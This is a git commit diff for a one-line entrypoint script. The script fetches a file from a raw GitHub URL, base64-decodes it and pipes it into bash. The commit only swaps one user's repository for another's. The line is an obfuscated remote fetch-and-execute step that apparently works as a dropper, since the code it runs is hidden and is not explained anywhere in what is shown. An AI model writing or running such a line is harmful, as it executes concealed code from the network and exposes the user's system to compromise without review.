acbcfcd39deed41b85070c16eb3138f15c054c38
kevinyamashita351 <kevin.yamashita35@gmail.com>
2026-06-18 20:37:05 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/alonzomcleroy1/music/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/kevinyamashita351/population/refs/heads/main/entrypoint.sh | base64 -d | bash
